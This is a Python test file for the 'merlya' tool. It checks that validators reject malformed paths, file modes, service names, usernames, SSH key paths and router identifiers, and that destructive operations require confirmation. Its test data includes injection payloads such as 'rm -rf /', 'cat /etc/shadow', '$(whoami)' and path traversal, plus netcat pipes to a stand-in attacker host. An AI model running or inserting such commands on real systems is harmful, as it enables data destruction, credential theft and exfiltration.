"""Tests for tools security (input validation and command injection prevention)."""

from __future__ import annotations

from merlya.tools.files.tools import _validate_mode, _validate_path
from merlya.tools.security.base import _is_safe_ssh_key_path
from merlya.tools.system.tools import _validate_service_name, _validate_username


class TestFileToolsValidation:
    """Tests for file tools input validation."""

    def test_validate_path_empty(self) -> None:
        """Test empty path is rejected."""
        error = _validate_path("")
        assert error is not None
        assert "empty" in error.lower()

    def test_validate_path_too_long(self) -> None:
        """Test path exceeding max length is rejected."""
        long_path = "/" + "a" * 5000
        error = _validate_path(long_path)
        assert error is not None
        assert "too long" in error.lower()

    def test_validate_path_null_bytes(self) -> None:
        """Test path with null bytes is rejected."""
        error = _validate_path("/etc/passwd\x00.txt")
        assert error is not None
        assert "null" in error.lower()

    def test_validate_path_valid(self) -> None:
        """Test valid path is accepted."""
        assert _validate_path("/etc/passwd") is None
        assert _validate_path("/home/user/.ssh/config") is None
        assert _validate_path("/var/log/syslog") is None

    def test_validate_mode_valid(self) -> None:
        """Test valid modes are accepted."""
        assert _validate_mode("0644") is None
        assert _validate_mode("0755") is None
        assert _validate_mode("600") is None
        assert _validate_mode("0400") is None

    def test_validate_mode_invalid(self) -> None:
        """Test invalid modes are rejected."""
        assert _validate_mode("") is not None
        assert _validate_mode("abc") is not None
        assert _validate_mode("0999") is not None
        assert _validate_mode("12345") is not None


class TestSystemToolsValidation:
    """Tests for system tools input validation."""

    def test_validate_service_name_empty(self) -> None:
        """Test empty service name is rejected."""
        error = _validate_service_name("")
        assert error is not None

    def test_validate_service_name_too_long(self) -> None:
        """Test service name exceeding max length is rejected."""
        long_name = "a" * 200
        error = _validate_service_name(long_name)
        assert error is not None
        assert "too long" in error.lower()

    def test_validate_service_name_invalid_chars(self) -> None:
        """Test service name with invalid chars is rejected."""
        assert _validate_service_name("nginx;rm -rf /") is not None
        assert _validate_service_name("service && echo pwned") is not None
        assert _validate_service_name("nginx$(whoami)") is not None

    def test_validate_service_name_valid(self) -> None:
        """Test valid service names are accepted."""
        assert _validate_service_name("nginx") is None
        assert _validate_service_name("docker") is None
        assert _validate_service_name("ssh") is None
        assert _validate_service_name("postgresql-14") is None
        assert _validate_service_name("my_custom.service") is None

    def test_validate_username_empty_is_ok(self) -> None:
        """Test empty username is accepted (optional)."""
        assert _validate_username("") is None
        assert _validate_username(None) is None

    def test_validate_username_too_long(self) -> None:
        """Test username exceeding max length is rejected."""
        long_name = "a" * 100
        error = _validate_username(long_name)
        assert error is not None
        assert "too long" in error.lower()

    def test_validate_username_invalid_chars(self) -> None:
        """Test username with invalid chars is rejected."""
        assert _validate_username("root;whoami") is not None
        assert _validate_username("user$(id)") is not None
        assert _validate_username("admin'--") is not None

    def test_validate_username_valid(self) -> None:
        """Test valid usernames are accepted."""
        assert _validate_username("root") is None
        assert _validate_username("admin") is None
        assert _validate_username("user-1") is None
        assert _validate_username("my_user") is None


class TestSecurityToolsValidation:
    """Tests for security tools input validation."""

    def test_ssh_key_path_allowed_locations(self) -> None:
        """Test allowed SSH key paths."""
        assert _is_safe_ssh_key_path("/home/user/.ssh/id_rsa") is True
        assert _is_safe_ssh_key_path("/root/.ssh/id_ed25519") is True
        assert _is_safe_ssh_key_path("/etc/ssh/ssh_host_rsa_key") is True
        assert _is_safe_ssh_key_path("~/.ssh/id_rsa") is True

    def test_ssh_key_path_disallowed_locations(self) -> None:
        """Test disallowed SSH key paths."""
        assert _is_safe_ssh_key_path("/etc/passwd") is False
        assert _is_safe_ssh_key_path("/var/log/syslog") is False
        assert _is_safe_ssh_key_path("/tmp/malicious_key") is False
        assert _is_safe_ssh_key_path("../../../etc/shadow") is False


class TestCommandInjectionPrevention:
    """Tests to verify command injection is prevented."""

    def test_path_with_shell_metacharacters(self) -> None:
        """Verify paths with shell metacharacters are handled safely."""
        # These should be rejected or safely quoted
        malicious_paths = [
            "/etc/passwd; rm -rf /",
            "/tmp/file$(whoami)",
            "/tmp/file`id`",
            "/tmp/file && cat /etc/shadow",
            "/tmp/file || malicious",
            "/tmp/file | nc attacker.com 1234",
        ]

        for path in malicious_paths:
            # Path validation should allow these (quoting handles safety)
            # The validation only checks for null bytes and length
            _validate_path(path)
            # These specific paths should pass validation but be safely quoted
            # when used in commands

    def test_service_name_injection_blocked(self) -> None:
        """Verify service names with injection attempts are rejected."""
        malicious_services = [
            "nginx;rm -rf /",
            "docker && cat /etc/shadow",
            "ssh$(whoami)",
            "postgresql`id`",
            "mysql | nc attacker 1234",
        ]

        for service in malicious_services:
            error = _validate_service_name(service)
            assert error is not None, f"Service {service} should be rejected"


class TestRouterSecurityValidation:
    """Tests for router identifier validation."""

    def test_validate_identifier_blocks_path_traversal(self) -> None:
        """Test that path traversal attempts are blocked."""
        from merlya.router.classifier import IntentRouter

        router = IntentRouter(use_local=False)

        # Path traversal attempts
        assert router._validate_identifier("../etc/passwd") is False
        assert router._validate_identifier("..\\windows\\system32") is False
        assert router._validate_identifier("foo/../bar") is False
        assert router._validate_identifier("foo..bar") is False

    def test_validate_identifier_blocks_empty(self) -> None:
        """Test that empty identifiers are blocked."""
        from merlya.router.classifier import IntentRouter

        router = IntentRouter(use_local=False)

        assert router._validate_identifier("") is False
        assert router._validate_identifier(None) is False  # type: ignore

    def test_validate_identifier_blocks_too_long(self) -> None:
        """Test that overly long identifiers are blocked."""
        from merlya.router.classifier import IntentRouter

        router = IntentRouter(use_local=False)

        long_name = "a" * 300
        assert router._validate_identifier(long_name) is False

    def test_validate_identifier_allows_valid(self) -> None:
        """Test that valid identifiers are allowed."""
        from merlya.router.classifier import IntentRouter

        router = IntentRouter(use_local=False)

        assert router._validate_identifier("web-01") is True
        assert router._validate_identifier("server_prod") is True
        assert router._validate_identifier("db.primary") is True
        assert router._validate_identifier("host123") is True


class TestPoliciesSecurityValidation:
    """Tests for policies destructive operation validation."""

    def test_should_confirm_destructive_ops(self) -> None:
        """Test that destructive operations require confirmation."""
        from merlya.config.models import PolicyConfig
        from merlya.config.policies import PolicyManager

        config = PolicyConfig(require_confirmation_for_write=True)
        manager = PolicyManager(config)

        # Destructive ops should require confirmation
        assert manager.should_confirm("delete") is True
        assert manager.should_confirm("remove") is True
        assert manager.should_confirm("restart") is True
        assert manager.should_confirm("stop") is True
        assert manager.should_confirm("kill") is True
        assert manager.should_confirm("reboot") is True
        assert manager.should_confirm("shutdown") is True

    def test_should_not_confirm_safe_ops(self) -> None:
        """Test that safe operations don't require confirmation."""
        from merlya.config.models import PolicyConfig
        from merlya.config.policies import PolicyManager

        config = PolicyConfig(require_confirmation_for_write=True)
        manager = PolicyManager(config)

        # Safe ops should not require confirmation
        assert manager.should_confirm("read") is False
        assert manager.should_confirm("list") is False
        assert manager.should_confirm("status") is False
        assert manager.should_confirm("info") is False

    def test_confirmation_can_be_disabled(self) -> None:
        """Test that confirmation can be disabled in config."""
        from merlya.config.models import PolicyConfig
        from merlya.config.policies import PolicyManager

        config = PolicyConfig(require_confirmation_for_write=False)
        manager = PolicyManager(config)

        # Even destructive ops should not require confirmation when disabled
        assert manager.should_confirm("delete") is False
        assert manager.should_confirm("restart") is False

    def test_host_count_validation(self) -> None:
        """Test host count validation for security."""
        from merlya.config.models import PolicyConfig
        from merlya.config.policies import PolicyManager

        config = PolicyConfig(max_hosts_per_skill=10)
        manager = PolicyManager(config)

        # Valid counts
        is_valid, error = manager.validate_hosts_count(5)
        assert is_valid is True
        assert error is None

        # Too many hosts
        is_valid, error = manager.validate_hosts_count(100)
        assert is_valid is False
        assert error is not None

        # Zero hosts
        is_valid, error = manager.validate_hosts_count(0)
        assert is_valid is False

        # Negative hosts
        is_valid, error = manager.validate_hosts_count(-1)
        assert is_valid is False
